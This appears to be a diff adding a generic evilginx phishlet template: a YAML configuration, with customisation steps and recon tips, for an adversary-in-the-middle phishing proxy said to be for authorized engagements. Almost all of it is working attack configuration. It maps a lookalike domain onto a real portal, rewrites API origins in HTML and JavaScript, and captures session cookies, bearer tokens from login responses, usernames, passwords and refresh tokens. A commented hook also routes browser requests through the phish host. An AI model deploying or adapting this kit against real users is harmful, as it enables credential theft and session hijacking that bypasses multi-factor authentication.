@@ -1,0 +1,150 @@
+# =============================================================================
+# GENERIC PORTAL PHISHLET TEMPLATE
+# =============================================================================
+#
+# This is a STARTING POINT for an authorized engagement.
+# YOU MUST CUSTOMIZE IT FOR EACH CLIENT.
+#
+# Steps:
+#   1. Copy this file to <client>-portal.yaml
+#   2. Replace every instance of TARGET_DOMAIN and LOOKALIKE_DOMAIN
+#   3. Update proxy_hosts to match the real application's hostnames
+#   4. Adjust credentials: and auth_tokens: based on what the login flow actually does
+#   5. Add sub_filters or js_inject if the app hard-codes API origins in JS bundles
+#   6. Test with `make validate-phishlet PHISHLET=<client>-portal`
+#
+# Recon tips before writing the phishlet:
+#   - Use browser devtools + Burp to watch the exact login POST
+#   - Note Content-Type (form vs JSON)
+#   - Note whether the session token comes back in a cookie, JSON body, or both
+#   - Check if HSTS preload is present on the real domain (affects dry-run)
+#
+# =============================================================================
+
+min_ver: '3.0.0'
+
+# -----------------------------------------------------------------------------
+# CUSTOMIZE: proxy_hosts
+# -----------------------------------------------------------------------------
+# List every host the real application uses that you need to intercept.
+# Typical pattern for a modern SPA:
+#   - portal / app host (is_landing: true)
+#   - one or more API hosts (often on a different subdomain)
+#
+# The phish_sub values become the left-hand side of your lookalike domain.
+# Example: if your lookalike is "acme-secure.com" then:
+#   portal.acme-secure.com  →  portal.target.com
+#   api.acme-secure.com     →  api.target.com
+# -----------------------------------------------------------------------------
+proxy_hosts:
+  # LANDING_SUB is '' for apex sites (example.com → example.phishkit)
+  # or www/app/portal/… when that is the real website hostname.
+  - {phish_sub: 'LANDING_SUB', orig_sub: 'LANDING_SUB', domain: 'TARGET_DOMAIN', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'api',    orig_sub: 'api',    domain: 'TARGET_DOMAIN', session: true, is_landing: false, auto_filter: true}
+
+# -----------------------------------------------------------------------------
+# CUSTOMIZE: sub_filters (optional but often required)
+# -----------------------------------------------------------------------------
+# Many SPAs hard-code the API origin inside minified JS bundles.
+# auto_filter catches most cases, but gzipped bundles or build-time constants
+# can slip through. Add explicit sub_filters for those strings.
+#
+# The example below shows the common pattern of rewriting the real API origin
+# to the phish API origin inside HTML and JS responses.
+# -----------------------------------------------------------------------------
+sub_filters:
+  - triggers_on: 'PORTAL_HOST'
+    orig_sub: 'LANDING_SUB'
+    domain: 'TARGET_DOMAIN'
+    search: 'https://api\.TARGET_DOMAIN'
+    replace: 'https://api.{domain}'
+    mimes: ['text/html','application/javascript','text/javascript','application/x-javascript','application/json']
+
+  # Add more sub_filters here if recon shows other hard-coded origins
+  # (e.g. direct cloud run / S3 / CDN URLs that bypass your proxy).
+
+# -----------------------------------------------------------------------------
+# CUSTOMIZE: auth_tokens
+# -----------------------------------------------------------------------------
+# Declare the cookies (or body tokens) that evilginx should treat as session material.
+# For apps that put the bearer token in the JSON response body instead of a cookie,
+# use type: 'body' exactly as shown in the second block.
+#
+# IMPORTANT: If your app does NOT set any cookies for auth, you still need to
+# declare the cookie keys as optional (',opt') so evilginx's "all tokens captured"
+# gate does not block the body token from being persisted.
+# -----------------------------------------------------------------------------
+auth_tokens:
+  # Cookie-based auth tokens (mark optional if your app doesn't actually set them)
+  - domain: '.TARGET_DOMAIN'
+    keys:
+      - 'session,opt'
+      - 'access_token,opt'
+      - 'token,opt'
+      - 'auth,opt'
+
+  # JWT / bearer token returned in the login response body (very common pattern)
+  - domain: 'api.TARGET_DOMAIN'
+    type: 'body'
+    path: '/api/token'          # <-- CHANGE to the actual login path from recon
+    name: 'access_token'
+    search: '"access_token"\s*:\s*"([^"]+)"'
+
+# -----------------------------------------------------------------------------
+# CUSTOMIZE: credentials
+# -----------------------------------------------------------------------------
+# What evilginx should harvest from the login POST (and any other POSTs you want).
+# The 'custom' section is perfect for extra fields the app returns alongside the
+# main token (refresh_token, local_id, expires_in, etc.).
+# -----------------------------------------------------------------------------
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    # Add any additional fields your recon showed in the login response or
+    # subsequent requests. Common examples:
+    - key: 'refresh_token'
+      search: '(.*)'
+      type: 'post'
+    - key: 'id_token'
+      search: '(.*)'
+      type: 'post'
+    - key: 'expires_in'
+      search: '(.*)'
+      type: 'post'
+
+# -----------------------------------------------------------------------------
+# CUSTOMIZE: login (used by some evilginx features to know where the login page is)
+# -----------------------------------------------------------------------------
+login:
+  domain: 'PORTAL_HOST'
+  path: '/login'               # <-- change to the real login path
+
+# -----------------------------------------------------------------------------
+# OPTIONAL: js_inject (advanced — only when sub_filters are not enough)
+# -----------------------------------------------------------------------------
+# If the application uses a JavaScript framework that makes it impossible to
+# reliably rewrite origins with sub_filters (rare but happens with heavy
+# minification + service workers), you can inject a small hook that forces
+# all fetch/XHR calls through the phish host.
+#
+# A minimal generic version is provided in ../browser_inject.js.
+# Reference it here if you need it.
+# -----------------------------------------------------------------------------
+# js_inject:
+#   - id: 'force_proxy_api'
+#     trigger_domains:
+#       - 'PORTAL_HOST'
+#     trigger_paths:
+#       - '.*'
+#     trigger_params: []
+#     script: |
+#       (function () {
+#         // paste contents of browser_inject.js here or keep it external
+#       })();
